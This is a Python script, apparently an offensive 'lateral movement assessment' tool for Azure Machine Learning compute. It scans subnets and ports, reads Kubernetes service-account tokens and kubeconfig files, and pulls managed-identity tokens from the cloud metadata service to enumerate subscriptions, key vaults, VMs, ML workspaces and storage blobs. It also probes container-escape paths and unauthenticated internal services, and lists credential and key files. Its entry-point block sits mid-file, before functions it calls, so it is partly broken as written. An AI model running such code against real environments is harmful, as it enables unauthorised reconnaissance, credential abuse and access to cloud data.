import json
import requests
import os
import sys
import socket
import subprocess
import platform
import uuid
import datetime
import ipaddress
import base64
from pathlib import Path
import traceback
import re
import tempfile
import time
import xml.etree.ElementTree as ET

def run_command(command, timeout=30):
    """Run a shell command and return output"""
    try:
        result = subprocess.run(command, shell=True, check=False, stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, text=True, timeout=timeout)
        return {
            "command": command,
            "returncode": result.returncode,
            "stdout": result.stdout,
            "stderr": result.stderr
        }
    except subprocess.TimeoutExpired:
        return {
            "command": command,
            "error": f"Command timed out after {timeout} seconds",
            "returncode": -1
        }
    except Exception as e:
        return {
            "command": command,
            "error": str(e),
            "returncode": -1
        }

def discover_network():
    """Discover network topology and accessible hosts"""
    results = {}
    
    # Get local network info
    network_info = {}
    
    # Get local interfaces
    if platform.system() == "Windows":
        ipconfig = run_command("ipconfig /all")
        network_info["interfaces"] = ipconfig
    else:
        ifconfig = run_command("ip addr")
        network_info["interfaces"] = ifconfig
        
        # Get routing table
        routes = run_command("ip route")
        network_info["routes"] = routes
    
    results["network_info"] = network_info
    
    # Extract IP addresses and subnets from interface info
    local_subnets = []
    ip_pattern = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}"
    
    # Check both stdout and stderr for IP addresses
    if platform.system() != "Windows":
        text_to_search = network_info["interfaces"]["stdout"] + network_info["interfaces"]["stderr"]
        matches = re.findall(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", text_to_search)
        for match in matches:
            if not match.startswith("127."):
                try:
                    subnet = ipaddress.IPv4Network(match, strict=False)
                    local_subnets.append(str(subnet))
                except:
                    pass
    
    results["local_subnets"] = local_subnets
    
    # Get ARP table to find known hosts
    if platform.system() == "Windows":
        arp = run_command("arp -a")
    else:
        arp = run_command("ip neigh")
    
    results["arp_table"] = arp
    
    # Extract IP addresses from ARP table
    known_hosts = []
    if platform.system() != "Windows":
        text_to_search = arp["stdout"] + arp["stderr"]
        matches = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", text_to_search)
        known_hosts.extend([ip for ip in matches if not ip.startswith("127.")])
    
    results["known_hosts"] = list(set(known_hosts))  # Remove duplicates
    
    return results

def run_lateral_movement_assessment():
    """Run all lateral movement tests and compile results"""
    start_time = datetime.datetime.now()
    
    print("Starting lateral movement assessment...")
    
    report = {
        "timestamp": start_time.isoformat(),
        "compute_info": {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "python_version": sys.version,
            "cpu_count": os.cpu_count(),
            "uuid": str(uuid.uuid4())  # Generate a unique ID for this report
        },
        "network_discovery": discover_network(),
        "kubernetes_access": test_kubernetes_access(),
        "managed_identity_access": test_managed_identity_access(),
        "container_escape": test_docker_escape(),
        "metadata_services": test_metadata_services(),
        "unprotected_services": scan_for_unprotected_services(),
        "credential_leaks": test_for_credential_leaks(),
        "storage_access": test_for_storage_access(),
        "aml_specific": test_aml_specific_vectors()
    }
    
    end_time = datetime.datetime.now()
    report["execution_time_seconds"] = (end_time - start_time).total_seconds()
    
    # Save results to a file
    output_path = "/tmp/lateral_movement_assessment.json"
    with open(output_path, "w") as f:
        json.dump(report, f, indent=2, default=str)
    
    print(f"Lateral movement assessment complete. Results saved to: {output_path}")
    
    # Print summary
    print("\n=== LATERAL MOVEMENT ASSESSMENT SUMMARY ===")
    print(f"Hostname: {report['compute_info']['hostname']}")
    print(f"Platform: {report['compute_info']['platform']}")
    
    # Network summary
    subnets = report['network_discovery'].get('local_subnets', [])
    hosts = report['network_discovery'].get('known_hosts', [])
    print(f"Network: {len(subnets)} subnets, {len(hosts)} hosts discovered")
    
    # Kubernetes access
    k8s_access = report['kubernetes_access'].get('kubernetes_service_accessible', False)
    print(f"Kubernetes Access: {'Available' if k8s_access else 'Not Available'}")
    
    # Managed Identity
    arm_token = report['managed_identity_access'].get('arm_token_acquired', False)
    print(f"Managed Identity ARM Access: {'Available' if arm_token else 'Not Available'}")
    
    # Container status
    in_container = report['container_escape'].get('in_container', False)
    print(f"Container Status: {'Inside Container' if in_container else 'Not in Container'}")
    
    # Metadata services
    imds_access = report['metadata_services'].get('azure_imds', {}).get('accessible', False)
    print(f"IMDS Access: {'Available' if imds_access else 'Not Available'}")
    
    # Credential leaks
    cred_count = report['credential_leaks'].get('credential_files', {}).get('count', 0)
    print(f"Potential Credential Files: {cred_count}")
    
    # Storage access
    storage_token = report['storage_access'].get('storage_token_acquired', False)
    storage_accounts = len(report['storage_access'].get('storage_accounts_found', []))
    print(f"Storage Access: {'Available' if storage_token else 'Not Available'} ({storage_accounts} accounts found)")
    
    # AML specific
    ml_workspaces = 0
    if 'ml_workspaces' in report.get('aml_specific', {}):
        for sub_id, sub_data in report['aml_specific']['ml_workspaces'].items():
            ml_workspaces += sub_data.get('count', 0)
    
    print(f"Azure ML Workspaces Accessible: {ml_workspaces}")
    
    # Identify critical findings for lateral movement
    print("\n=== CRITICAL LATERAL MOVEMENT VECTORS ===")
    
    critical_findings = []
    
    # Check for docker socket access (container escape)
    if report['container_escape'].get('docker_socket_mounted', False):
        critical_findings.append("Docker socket mounted - potential container escape")
    
    # Check for privileged container
    privileged = any(v.get('writable', False) for k, v in 
                    report['container_escape'].get('privileged_indicators', {}).items())
    if privileged:
        critical_findings.append("Container running in privileged mode - potential host access")
    
    # Check for suspicious mounts
    if report['container_escape'].get('suspicious_mounts', []):
        critical_findings.append(f"Suspicious host paths mounted: {len(report['container_escape']['suspicious_mounts'])} found")
    
    # Check for unprotected services
    for service, data in report['unprotected_services'].get('localhost', {}).items():
        if data.get('accessible', False):
            critical_findings.append(f"Unprotected {service} service accessible locally")
    
    # Check for exposed services on subnet
    if 'live_hosts' in report['unprotected_services'].get('subnet_scan', {}):
        live_host_count = len(report['unprotected_services']['subnet_scan']['live_hosts'])
        if live_host_count > 1:  # More than just localhost
            critical_findings.append(f"Multiple live hosts ({live_host_count}) found on local subnet")
            
            # Check for critical ports
            critical_port_hosts = []
            for host, port_data in report['unprotected_services']['subnet_scan'].get('port_scan', {}).items():
                for port, port_info in port_data.items():
                    if port_info.get('state', '') == 'OPEN' and port in [22, 6379, 6443, 10250, 27017]:
                        critical_port_hosts.append(f"{host}:{port}")
            
            if critical_port_hosts:
                critical_findings.append(f"Critical ports open on network: {', '.join(critical_port_hosts[:5])}")
    
    # Check for storage account access
    storage_results = report['storage_access'].get('storage_access_results', {})
    for account, account_data in storage_results.items():
        if account_data.get('containers', {}).get('accessible', False):
            critical_findings.append(f"Storage account {account} containers accessible")
    
    # Check for kubernetes access
    if report['kubernetes_access'].get('kubernetes_service_accessible', False):
        critical_findings.append("Kubernetes API accessible")
    
    # Check for AML workspace access
    if 'ml_workspaces' in report.get('aml_specific', {}):
        for sub_id, sub_data in report['aml_specific']['ml_workspaces'].items():
            for ws in sub_data.get('workspaces', []):
                if ws.get('compute_access', {}).get('accessible', False):
                    critical_findings.append(f"AML workspace {ws['name']} compute resources accessible")
    
    # Print critical findings
    if critical_findings:
        for finding in critical_findings:
            print(f"- {finding}")
    else:
        print("No critical lateral movement vectors identified")
    
    return report

if __name__ == "__main__":
    try:
        report = run_lateral_movement_assessment()
    except Exception as e:
        print(f"Error during lateral movement assessment: {str(e)}")
        traceback.print_exc()
        sys.exit(1)

def scan_subnet(subnet, ports_to_scan=None):
    """Scan a subnet for hosts and open ports"""
    if ports_to_scan is None:
        ports_to_scan = [22, 80, 443, 445, 1433, 3306, 5432, 6379, 8080, 8443, 9200, 9300, 27017, 6443]
    
    results = {}
    
    # First, scan for live hosts with ping to avoid timeout on every port scan
    live_hosts = []
    
    try:
        network = ipaddress.IPv4Network(subnet)
        
        # Limit scan to first 25 hosts in large subnets
        hosts_to_scan = list(network.hosts())[:25]
        
        for host in hosts_to_scan:
            host_str = str(host)
            
            # Skip local address
            if host_str.startswith("127."):
                continue
                
            ping_result = run_command(f"ping -c 1 -W 1 {host_str}" if platform.system() != "Windows" 
                                     else f"ping -n 1 -w 1000 {host_str}", timeout=2)
            
            if ping_result["returncode"] == 0:
                live_hosts.append(host_str)
    except Exception as e:
        results["error"] = str(e)
    
    results["live_hosts"] = live_hosts
    results["port_scan"] = {}
    
    # Now scan ports on live hosts
    for host in live_hosts:
        results["port_scan"][host] = {}
        
        for port in ports_to_scan:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                
                if result == 0:
                    # Port is open, try to get service banner for identification
                    try:
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    except:
                        banner = ""
                    
                    results["port_scan"][host][port] = {
                        "state": "OPEN",
                        "banner": banner[:200] if banner else ""
                    }
                else:
                    results["port_scan"][host][port] = {
                        "state": f"CLOSED ({result})"
                    }
                sock.close()
            except Exception as e:
                results["port_scan"][host][port] = {
                    "state": f"ERROR: {str(e)}"
                }
    
    return results

def test_kubernetes_access():
    """Test if we have access to Kubernetes endpoints and API"""
    results = {}
    
    # Check for kubectl
    kubectl = run_command("which kubectl || echo 'Not found'")
    results["kubectl_installed"] = "Not found" not in kubectl["stdout"]
    
    # Check for kubeconfig files
    kube_config_locations = [
        os.path.expanduser("~/.kube/config"),
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    ]
    
    found_configs = {}
    for loc in kube_config_locations:
        path = Path(loc)
        if path.exists():
            try:
                if path.is_file() and path.stat().st_size < 10000:
                    with open(loc, 'r') as f:
                        content = f.read()
                    found_configs[loc] = content
                else:
                    found_configs[loc] = "File exists but too large to include"
            except:
                found_configs[loc] = "File exists but couldn't read"
    
    results["kube_configs"] = found_configs
    
    # Check for kubernetes service
    try:
        socket_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_test.settimeout(2)
        k8s_access = socket_test.connect_ex(("kubernetes.default.svc", 443)) == 0
        socket_test.close()
        results["kubernetes_service_accessible"] = k8s_access
    except:
        results["kubernetes_service_accessible"] = False
    
    # If kubectl is available, try to use it
    if results["kubectl_installed"]:
        kubectl_version = run_command("kubectl version --short")
        results["kubectl_version"] = kubectl_version
        
        kubectl_nodes = run_command("kubectl get nodes -o wide")
        results["kubectl_nodes"] = kubectl_nodes
        
        kubectl_pods = run_command("kubectl get pods --all-namespaces")
        results["kubectl_pods"] = kubectl_pods
    
    return results

def test_managed_identity_access():
    """Test what resources the managed identity can access"""
    results = {}
    
    # Check if MSI endpoint is available
    msi_endpoint = os.environ.get("MSI_ENDPOINT", "http://169.254.169.254/metadata/identity/oauth2/token")
    msi_secret = os.environ.get("MSI_SECRET", "")
    
    # Try to get a token for ARM
    try:
        headers = {"Metadata": "true"}
        params = {
            "api-version": "2018-02-01",
            "resource": "https://management.azure.com/"
        }
        
        if msi_secret:
            params["secret"] = msi_secret
        
        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
        if response.status_code == 200:
            token_data = response.json()
            token = token_data.get("access_token", "")
            
            # Don't store the actual token in the results
            results["arm_token_acquired"] = bool(token)
            
            # Now test what subscriptions/resources we can access
            if token:
                headers = {"Authorization": f"Bearer {token}"}
                
                # List subscriptions
                sub_response = requests.get(
                    "https://management.azure.com/subscriptions?api-version=2020-01-01",
                    headers=headers,
                    timeout=10
                )
                
                results["subscriptions_accessible"] = {
                    "status_code": sub_response.status_code,
                    "subscription_count": len(sub_response.json().get("value", [])) if sub_response.status_code == 200 else 0
                }
                
                # If we have subscription access, test a few key resource types
                if sub_response.status_code == 200:
                    subscriptions = [s["subscriptionId"] for s in sub_response.json().get("value", [])]
                    
                    if subscriptions:
                        test_subscription = subscriptions[0]
                        
                        # Test storage accounts access
                        storage_response = requests.get(
                            f"https://management.azure.com/subscriptions/{test_subscription}/providers/Microsoft.Storage/storageAccounts?api-version=2021-04-01",
                            headers=headers,
                            timeout=10
                        )
                        
                        results["storage_accounts_accessible"] = {
                            "status_code": storage_response.status_code,
                            "count": len(storage_response.json().get("value", [])) if storage_response.status_code == 200 else 0
                        }
                        
                        # Test key vault access
                        kv_response = requests.get(
                            f"https://management.azure.com/subscriptions/{test_subscription}/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01",
                            headers=headers,
                            timeout=10
                        )
                        
                        results["key_vaults_accessible"] = {
                            "status_code": kv_response.status_code,
                            "count": len(kv_response.json().get("value", [])) if kv_response.status_code == 200 else 0
                        }
                        
                        # Test VM access
                        vm_response = requests.get(
                            f"https://management.azure.com/subscriptions/{test_subscription}/providers/Microsoft.Compute/virtualMachines?api-version=2021-03-01",
                            headers=headers,
                            timeout=10
                        )
                        
                        results["vms_accessible"] = {
                            "status_code": vm_response.status_code,
                            "count": len(vm_response.json().get("value", [])) if vm_response.status_code == 200 else 0
                        }
        else:
            results["arm_token_acquired"] = False
            results["token_acquisition_error"] = {
                "status_code": response.status_code,
                "response": response.text[:200]
            }
    except Exception as e:
        results["arm_token_acquired"] = False
        results["token_acquisition_error"] = str(e)
    
    # Try to get a token for Key Vault
    try:
        headers = {"Metadata": "true"}
        params = {
            "api-version": "2018-02-01",
            "resource": "https://vault.azure.net"
        }
        
        if msi_secret:
            params["secret"] = msi_secret
        
        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
        results["keyvault_token_acquired"] = (response.status_code == 200)
    except:
        results["keyvault_token_acquired"] = False
    
    # Try to get a token for Storage
    try:
        headers = {"Metadata": "true"}
        params = {
            "api-version": "2018-02-01",
            "resource": "https://storage.azure.com/"
        }
        
        if msi_secret:
            params["secret"] = msi_secret
        
        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
        results["storage_token_acquired"] = (response.status_code == 200)
    except:
        results["storage_token_acquired"] = False
    
    return results

def test_docker_escape():
    """Test if we can escape from a docker container"""
    results = {}
    
    # Check if we're in a container (note: not 100% reliable)
    in_container = False
    
    # Check for container indicators
    docker_env = Path("/.dockerenv")
    cgroup_file = Path("/proc/1/cgroup")
    
    if docker_env.exists():
        in_container = True
        results["container_indicator"] = "/.dockerenv exists"
    elif cgroup_file.exists():
        try:
            with open(cgroup_file, 'r') as f:
                cgroup_content = f.read()
                if 'docker' in cgroup_content or 'lxc' in cgroup_content:
                    in_container = True
                    results["container_indicator"] = "docker/lxc found in cgroup"
        except:
            pass
    
    results["in_container"] = in_container
    
    if in_container:
        # Check for privileged mode
        security_dirs = [
            "/sys/admin",
            "/sys/kernel",
            "/dev/mem",
            "/dev/kmem",
            "/dev/port",
            "/proc/kcore",
            "/proc/sys/kernel"
        ]
        
        privileged_indicators = {}
        for sd in security_dirs:
            path = Path(sd)
            try:
                privileged_indicators[sd] = {
                    "exists": path.exists(),
                    "writable": os.access(sd, os.W_OK) if path.exists() else False
                }
            except:
                privileged_indicators[sd] = {"exists": "error checking"}
        
        results["privileged_indicators"] = privileged_indicators
        
        # Check for mounted docker socket
        docker_socket = Path("/var/run/docker.sock")
        results["docker_socket_mounted"] = docker_socket.exists()
        
        if docker_socket.exists():
            socket_writable = os.access("/var/run/docker.sock", os.W_OK)
            results["docker_socket_writable"] = socket_writable
            
            # Try docker command
            docker_ps = run_command("docker ps")
            results["docker_access"] = docker_ps["returncode"] == 0
        
        # Check for host mounts
        mounts_cmd = run_command("mount")
        results["mounts"] = mounts_cmd
        
        # Look for suspicious bind mounts from host
        suspicious_mounts = []
        if mounts_cmd["returncode"] == 0:
            suspicious_patterns = [
                "/var/run/docker.sock",
                "/var/lib/docker",
                "/home/",
                "/root",
                "/.ssh",
                "/etc/kubernetes",
                "/etc/passwd",
                "/etc/shadow",
                "/var/run/secrets"
            ]
            
            for line in mounts_cmd["stdout"].splitlines():
                for pattern in suspicious_patterns:
                    if pattern in line:
                        suspicious_mounts.append(line)
        
        results["suspicious_mounts"] = suspicious_mounts
        
        # Check for capabilities
        cap_cmd = run_command("capsh --print || getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null")
        results["capabilities"] = cap_cmd
    
    return results

def test_metadata_services():
    """Test access to cloud provider metadata services for SSRF opportunities"""
    results = {}
    
    # Test Azure IMDS
    try:
        response = requests.get(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            headers={"Metadata": "true"},
            timeout=3
        )
        
        if response.status_code == 200:
            results["azure_imds"] = {
                "accessible": True,
                "data_sample": str(response.json())[:500] + "..."  # Truncate long responses
            }
        else:
            results["azure_imds"] = {
                "accessible": False,
                "status_code": response.status_code
            }
    except Exception as e:
        results["azure_imds"] = {
            "accessible": False,
            "error": str(e)
        }
    
    # Check for other metadata service addresses
    metadata_ips = [
        "169.254.169.254",  # AWS, Azure, GCP, DigitalOcean
        "169.254.170.2",    # AWS ECS task metadata
        "fd00:ec2::254",    # AWS IPv6
        "100.100.100.200",  # Alibaba Cloud
    ]
    
    for ip in metadata_ips:
        if ip == "169.254.169.254" and "azure_imds" in results:
            continue  # Already tested
            
        try:
            # Try different paths used by different cloud providers
            paths = ["", "/latest/meta-data/", "/computeMetadata/v1/"]
            headers = [{}, {"Metadata": "true"}, {"Metadata-Flavor": "Google"}]
            
            for path in paths:
                for header in headers:
                    try:
                        # Use a short timeout as these will fail if not accessible
                        url = f"http://{ip}{path}"
                        response = requests.get(url, headers=header, timeout=2)
                        
                        if response.status_code < 400:  # Any success or redirect
                            results[f"metadata_{ip}{path}"] = {
                                "accessible": True,
                                "status_code": response.status_code,
                                "headers": dict(response.headers),
                                "data_sample": response.text[:200] if response.text else ""
                            }
                            # Break early if we find something
                            break
                    except:
                        pass
        except:
            pass
    
    return results

def scan_for_unprotected_services():
    """Scan for internal services that might allow lateral movement"""
    results = {}
    
    # Services to check
    services = {
        "etcd": {
            "ports": [2379, 2380],
            "paths": ["/v2/keys", "/v2/members"],
            "test_commands": ["etcdctl ls /"]
        },
        "redis": {
            "ports": [6379],
            "test_commands": ["redis-cli -h localhost info", "redis-cli -h localhost CONFIG GET *"]
        },
        "mongodb": {
            "ports": [27017, 27018],
            "test_commands": ["mongo --eval 'db.adminCommand({listDatabases:1})'"]
        },
        "elasticsearch": {
            "ports": [9200, 9300],
            "paths": ["/", "/_cat/indices", "/_cluster/health"],
            "test_commands": ["curl -s localhost:9200/_cat/indices"]
        },
        "kubelet": {
            "ports": [10250, 10255, 4194],
            "paths": ["/pods", "/spec", "/stats/summary", "/healthz"],
            "test_commands": []
        },
        "dashboard": {
            "ports": [8443, 8080, 443],
            "paths": ["/api/v1", "/api/v1/namespaces/kube-system/services", "/api/v1/namespaces"],
            "test_commands": []
        },
        "docker_api": {
            "ports": [2375, 2376],
            "paths": ["/containers/json", "/info", "/version"],
            "test_commands": ["curl -s localhost:2375/info"]
        },
        "prometheus": {
            "ports": [9090],
            "paths": ["/metrics", "/api/v1/targets", "/graph"],
            "test_commands": []
        }
    }
    
    # Check from localhost first
    host = "localhost"
    results["localhost"] = {}
    
    for service_name, service_info in services.items():
        service_results = {"accessible": False, "ports": {}, "commands": {}, "paths": {}}
        
        # Check ports
        for port in service_info.get("ports", []):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                
                service_results["ports"][port] = {
                    "open": (result == 0)
                }
                
                if result == 0:
                    service_results["accessible"] = True
                
                sock.close()
            except Exception as e:
                service_results["ports"][port] = {
                    "error": str(e)
                }
        
        # Try HTTP endpoints if applicable
        for port in [p for p in service_info.get("ports", []) if service_results["ports"].get(p, {}).get("open", False)]:
            for path in service_info.get("paths", []):
                try:
                    url = f"http://{host}:{port}{path}"
                    response = requests.get(url, timeout=2)
                    
                    service_results["paths"][f"{port}{path}"] = {
                        "status_code": response.status_code,
                        "accessible": response.status_code < 400,
                        "data_sample": response.text[:200] if response.text else ""
                    }
                    
                    if response.status_code < 400:
                        service_results["accessible"] = True
                except Exception as e:
                    service_results["paths"][f"{port}{path}"] = {
                        "error": str(e)
                    }
        
        # Try service-specific commands
        for command in service_info.get("test_commands", []):
            cmd_result = run_command(command)
            service_results["commands"][command] = {
                "returncode": cmd_result["returncode"],
                "stdout_sample": cmd_result["stdout"][:200] if cmd_result["stdout"] else "",
                "stderr_sample": cmd_result["stderr"][:200] if cmd_result["stderr"] else ""
            }
            
            if cmd_result["returncode"] == 0:
                service_results["accessible"] = True
        
        results["localhost"][service_name] = service_results
    
    # Now scan the local subnet for a few critical services
    network_info = discover_network()
    local_subnets = network_info.get("local_subnets", [])
    
    if local_subnets:
        # Just use the first subnet for now
        subnet_to_scan = local_subnets[0]
        
        # Critical ports to scan on the network
        critical_ports = [
            22,     # SSH
            80,     # HTTP
            443,    # HTTPS
            2379,   # etcd
            6379,   # Redis
            6443,   # Kubernetes API
            8080,   # Various HTTP services
            10250,  # Kubelet
            27017   # MongoDB
        ]
        
        results["subnet_scan"] = scan_subnet(subnet_to_scan, critical_ports)
    
    return results

def test_for_credential_leaks():
    """Look for leaked credentials in environment, files, and logs"""
    results = {}
    
    # Check environment variables for credentials
    env_vars = dict(os.environ)
    sensitive_env_vars = {}
    
    # List of patterns that might indicate credentials
    sensitive_patterns = [
        "key", "secret", "password", "credential", "token", "accesskey", 
        "auth", "login", "pwd", "api", "cert", "jwt", "bearer"
    ]
    
    # Check environment variables
    for key, value in env_vars.items():
        for pattern in sensitive_patterns:
            if pattern.lower() in key.lower():
                sensitive_env_vars[key] = "[REDACTED]"  # Don't store actual credentials
                break
    
    results["sensitive_env_vars"] = {
        "count": len(sensitive_env_vars),
        "variables": list(sensitive_env_vars.keys())
    }
    
    # Common paths where credentials might be stored
    credential_paths = [
        os.path.expanduser("~/.aws"),
        os.path.expanduser("~/.azure"),
        os.path.expanduser("~/.kube"),
        os.path.expanduser("~/.ssh"),
        os.path.expanduser("~/.docker"),
        os.path.expanduser("~/.config"),
        os.path.expanduser("~/.bashrc"),
        os.path.expanduser("~/.bash_history"),
        os.path.expanduser("~/.profile"),
        "/etc/kubernetes",
        "/var/run/secrets",
        "/tmp",
        "/mnt/azureml/cr"
    ]
    
    # Check each path for existence
    found_credential_files = []
    for path_str in credential_paths:
        path = Path(path_str)
        if path.exists():
            if path.is_dir():
                # Just check files in the directory, don't go recursive
                try:
                    files = list(path.glob("*"))
                    for file in files:
                        if file.is_file():
                            # Check if file contains credential-like names
                            for pattern in sensitive_patterns:
                                if pattern.lower() in file.name.lower():
                                    found_credential_files.append(str(file))
                                    break
                except:
                    pass
            elif path.is_file():
                found_credential_files.append(str(path))
    
    results["credential_files"] = {
        "count": len(found_credential_files),
        "files": found_credential_files
    }
    
    # Look for certificates and keys
    cert_files = []
    for ext in [".pem", ".crt", ".cer", ".key", ".p12", ".pfx", ".jks"]:
        # Check common locations
        for base_path in ["/tmp", "/etc", "/var/run", os.path.expanduser("~")]:
            try:
                base_dir = Path(base_path)
                if base_dir.exists() and base_dir.is_dir():
                    # Don't go recursive, just check the base directories
                    for file in base_dir.glob(f"*{ext}"):
                        if file.is_file():
                            cert_files.append(str(file))
            except:
                pass
    
    results["certificate_files"] = {
        "count": len(cert_files),
        "files": cert_files
    }
    
    return results

def test_aml_specific_vectors():
    """Test for Azure ML specific lateral movement vectors"""
    results = {}
    
    # Check for access to other AML workspaces
    # Look for AML specific environment variables
    aml_env_vars = {}
    for key, value in os.environ.items():
        if any(x in key.upper() for x in ["AZUREML", "AML", "WORKSPACE"]):
            aml_env_vars[key] = value
    
    results["aml_env_vars"] = {k: v for k, v in aml_env_vars.items() if not any(
        s in k.lower() for s in ["key", "secret", "token", "password", "credential"])}
    
    # Check for AML workspace access
    try:
        # Try to get ARM token
        msi_endpoint = os.environ.get("MSI_ENDPOINT", "http://169.254.169.254/metadata/identity/oauth2/token")
        msi_secret = os.environ.get("MSI_SECRET", "")
        
        headers = {"Metadata": "true"}
        params = {
            "api-version": "2018-02-01",
            "resource": "https://management.azure.com/"
        }
        
        if msi_secret:
            params["secret"] = msi_secret
        
        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
        if response.status_code == 200:
            token_data = response.json()
            token = token_data.get("access_token", "")
            
            if token:
                # First get subscription list
                headers = {"Authorization": f"Bearer {token}"}
                sub_response = requests.get(
                    "https://management.azure.com/subscriptions?api-version=2020-01-01",
                    headers=headers,
                    timeout=10
                )
                
                if sub_response.status_code == 200:
                    subscriptions = sub_response.json().get("value", [])
                    results["subscription_count"] = len(subscriptions)
                    
                    # Check each subscription for ML workspaces
                    workspace_results = {}
                    
                    for sub in subscriptions[:3]:  # Limit to first 3 subscriptions
                        sub_id = sub["subscriptionId"]
                        
                        ml_response = requests.get(
                            f"https://management.azure.com/subscriptions/{sub_id}/providers/Microsoft.MachineLearningServices/workspaces?api-version=2021-07-01",
                            headers=headers,
                            timeout=15
                        )
                        
                        if ml_response.status_code == 200:
                            workspaces = ml_response.json().get("value", [])
                            workspace_results[sub_id] = {
                                "count": len(workspaces),
                                "workspaces": []
                            }
                            
                            # Check access to each workspace
                            for ws in workspaces[:3]:  # Limit to first 3 workspaces
                                ws_id = ws["id"]
                                ws_name = ws["name"]
                                ws_location = ws["location"]
                                
                                # Try to get compute resources in the workspace
                                compute_response = requests.get(
                                    f"https://management.azure.com{ws_id}/computes?api-version=2021-07-01",
                                    headers=headers,
                                    timeout=15
                                )
                                
                                ws_data = {
                                    "name": ws_name,
                                    "location": ws_location,
                                    "compute_access": {
                                        "status_code": compute_response.status_code,
                                        "accessible": compute_response.status_code == 200,
                                        "compute_count": len(compute_response.json().get("value", [])) if compute_response.status_code == 200 else 0
                                    }
                                }
                                
                                workspace_results[sub_id]["workspaces"].append(ws_data)
                    
                    results["ml_workspaces"] = workspace_results
    except Exception as e:
        results["aml_access_error"] = str(e)
    
    # Check for AML run history DB access
    # This could potentially allow access to other experiment logs
    run_history_endpoint = os.environ.get("AZUREML_RUN_HISTORY_SERVICE_ENDPOINT")
    if run_history_endpoint:
        results["run_history_endpoint"] = run_history_endpoint
        
        # Try to get token for run history
        try:
            headers = {"Metadata": "true"}
            params = {
                "api-version": "2018-02-01",
                "resource": "https://api.azureml.ms"  # Run history API resource
            }
            
            if msi_secret:
                params["secret"] = msi_secret
            
            response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
            results["run_history_token_acquired"] = (response.status_code == 200)
            
            if response.status_code == 200:
                # We could try to access run history API here, but it's complex and endpoint structure varies
                pass
        except Exception as e:
            results["run_history_token_error"] = str(e)
    
    # Check for mounted AML datasets
    dataset_mounts = []
    mount_result = run_command("mount | grep azureml")
    if mount_result["returncode"] == 0:
        for line in mount_result["stdout"].splitlines():
            dataset_mounts.append(line)
    
    results["dataset_mounts"] = dataset_mounts
    
    return results

def test_for_storage_access():
    """Test if we can access Azure Storage accounts directly"""
    results = {}
    
    # First get a token for storage access
    msi_endpoint = os.environ.get("MSI_ENDPOINT", "http://169.254.169.254/metadata/identity/oauth2/token")
    msi_secret = os.environ.get("MSI_SECRET", "")
    storage_token = None
    
    try:
        headers = {"Metadata": "true"}
        params = {
            "api-version": "2018-02-01",
            "resource": "https://storage.azure.com/"
        }
        
        if msi_secret:
            params["secret"] = msi_secret
        
        response = requests.get(msi_endpoint, headers=headers, params=params, timeout=10)
        if response.status_code == 200:
            token_data = response.json()
            storage_token = token_data.get("access_token", "")
            results["storage_token_acquired"] = bool(storage_token)
        else:
            results["storage_token_acquired"] = False
    except Exception as e:
        results["storage_token_acquired"] = False
        results["token_error"] = str(e)
    
    # Try to find storage account names from environment or mounted resources
    storage_accounts = []
    
    # Check environment variables for storage hints
    for key, value in os.environ.items():
        if "storage" in key.lower() and ".blob.core.windows.net" in value.lower():
            account_match = re.search(r"https?://([^\.]+)\.blob\.core\.windows\.net", value)
            if account_match:
                storage_accounts.append(account_match.group(1))
    
    # Check for storage account mount points
    mount_result = run_command("mount | grep fuse")
    if mount_result["returncode"] == 0:
        for line in mount_result["stdout"].splitlines():
            if "blob.core.windows.net" in line:
                account_match = re.search(r"([^\.]+)\.blob\.core\.windows\.net", line)
                if account_match:
                    storage_accounts.append(account_match.group(1))
    
    # Remove duplicates
    storage_accounts = list(set(storage_accounts))
    results["storage_accounts_found"] = storage_accounts
    
    # Try to access each storage account
    if storage_token and storage_accounts:
        access_results = {}
        
        for account in storage_accounts:
            account_result = {"containers": None, "blobs": {}}
            
            # Try to list containers
            try:
                headers = {"Authorization": f"Bearer {storage_token}"}
                response = requests.get(
                    f"https://{account}.blob.core.windows.net/?comp=list",
                    headers=headers,
                    timeout=10
                )
                
                account_result["containers"] = {
                    "status_code": response.status_code,
                    "accessible": response.status_code == 200
                }
                
                # If we can list containers, parse the XML to get container names
                if response.status_code == 200:
                    try:
                        import xml.etree.ElementTree as ET
                        root = ET.fromstring(response.text)
                        containers = []
                        
                        # Find container names in the XML
                        for container in root.findall("./Containers/Container/Name"):
                            containers.append(container.text)
                            
                        account_result["container_names"] = containers
                        
                        # Try to access a few containers if found
                        for container_name in containers[:3]:  # Limit to first 3
                            try:
                                blob_response = requests.get(
                                    f"https://{account}.blob.core.windows.net/{container_name}?restype=container&comp=list",
                                    headers=headers,
                                    timeout=10
                                )
                                
                                account_result["blobs"][container_name] = {
                                    "status_code": blob_response.status_code,
                                    "accessible": blob_response.status_code == 200,
                                    "sample": blob_response.text[:200] if blob_response.status_code == 200 else ""
                                }
                            except Exception as e:
                                account_result["blobs"][container_name] = {
                                    "error": str(e)
                                }
                    except Exception as e:
                        account_result["xml_parse_error"] = str(e)
            except Exception as e:
                account_result["error"] = str(e)
            
            access_results[account] = account_result
        
        results["storage_access_results"] = access_results
    
    return results